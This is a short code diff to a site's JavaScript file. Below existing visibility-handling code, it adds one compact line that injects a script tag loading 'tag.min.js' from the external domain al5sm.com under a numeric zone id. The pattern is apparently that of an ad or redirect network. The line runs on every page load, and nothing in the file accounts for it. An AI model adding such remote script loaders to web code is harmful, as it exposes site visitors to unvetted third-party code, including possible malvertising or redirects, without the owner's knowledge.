@@ -199,3 +199,5 @@ document.addEventListener("visibilitychange", function () {
 window.onload = function() {
     document.body.style.visibility = "visible"; 
   };
+
+(function(s){s.dataset.zone='10444724',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
